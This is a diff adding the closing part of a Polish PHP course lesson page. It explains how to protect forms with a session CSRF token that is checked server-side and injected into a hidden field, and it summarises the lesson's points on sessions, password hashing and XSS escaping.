+<pre><code class="language-php">public function checkTokenCRFT(): void{
+    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        http_response_code(403);
+        die("CSRF token invalid");
+    }
+}
+</code></pre>
+<p>Jeżeli w zapytaniu nie wysłano wartości tokenu w danych formularza z nazwą <code>csrf_token</code> lub jest ona niezgodna z tym co przechowuje serwer to wywoływana jest funkcja ustawiająca nagłówek odpowiedzi serwera $403$ <span class="color-green">Forbidden</span> i kończąca dalszy proces.</p>
+<p>Tą metodę należy wywołać na początku każdej innej metody rozpoczynającej pracę z danymi dowolnego formularza. Tak samo jak zrobiliśmy to w przypadku <code>unsetXSS()</code>:</p>
+<pre><code class="language-php">$this-&gt;checkTokenCRFT()
+</code></pre>
+<p>Teraz pozostało nam preparować komponenty stron i w ich formularzu ustawić „haczyk” na wstrzykniecie tokenu:</p>
+<pre><code class="language-html">&lt;input type="hidden" name="csrf_token" value="%%csrf_token%%"&gt;
+</code></pre>
+<p>W <code>router.php</code> dopisujemy linię podmieniającą „haczyk” na wartość tokenu:</p>
+<pre><code class="language-php">$register_login_section = str_replace("%%csrf_token%%", $_SESSION['csrf_token'], $register_login_section);
+</code></pre>
+<p>Efekt jest taki że server generuje losowy ciąg znaków który zwraca jako ukrytą kontrolkę w stronie html klienta. Wysyłąjąc formularz wartość ukrytej kontrolki jest doklejana do zapytania. Jeżeli serwer nie otrzyma jaj lub otrzyma inną wartość to odmawia wykonania akcji.</p>
+<p>Poniżej przykład gdy na stronie podmieniłem wartość tej ukrytej kontrolki więc serwer zamiast zalogować to zwrócił <code>ERROR 403</code>: </p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/zabezpieczone-logowanie-tokenem-CRFT.webp" alt="" width="1158" height="575" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+
+<h3><span class="header-koala"><span>🦾</span><span>🐨</span><span>🦾</span></span> Co masz wynieść z tej lekcji:</h3>
+<ul>
+<li>Ładny URL wymaga przygotowania routera mapującego linki na wywołanie odpowiednich metod.</li>
+<li>Hasła w bazie danych powinny być przechowywane w formie zahashowanej.</li>
+<li>Wystartowanie sesji pozwala odróżnić zalogowanego użytkownika od anonimowego i zwrócić odpowiedni widok.</li>
+<li>Poprawne przygotowanie parametrów sesji pozwala uchronić <span class="color-green">PHPSESSID</span>.</li>
+<li><code>htmlspecialchars()</code> zamienia znaki specjalne HTML na ich encje np. <code>&lt;</code> na <code>&amp;lt;</code>, <code>&gt;</code> na <code>&amp;gt;</code>, <code>&amp;</code> na <code>&amp;amp;</code> i inne. Co pozwala uchronić się przed jednym z rodzajów ataków XSS.</li>
+<li>Tokeny CRFT mają zapobiegać przed wykonaniem akcji w twojej witrynie bez twojej zgody np. usunięcie przez cyber‑przestępcę. Serwer porównuje otrzymany token np z formularza z tym przechowywanym w sesji.</li>
+</ul>
+<hr>
+<p>Aktualny stan kodu ma pewien brak.<br>Dopisz więc brakującą dokumentację <span class="color-gold">PHPDocs</span>, a w kolejnej lekcje będziemy dodawać kolejne funkcjonalności i refaktoryzować cały stan projektu. 😉</p>
+</section>
+        </article>
+
+        <!-- Puste miejsce na nawigację po nagłówkach -->
+        <section id="course-lesson-content-nav" class="drawer-right"></section>
+    </main>
+
+    <footer>
+      <p>
+        <button class="important-font scroll-to-top-btn" aria-label="Wróć na górę" title="Wróć na górę">⬆</button>
+        <span class="important-font">©</span> 2026 Koala-V
+      </p>
+      <p>kamil.zbrzezniak@teb.edu.pl</p>
+    </footer>
+
+</body>
+</html>
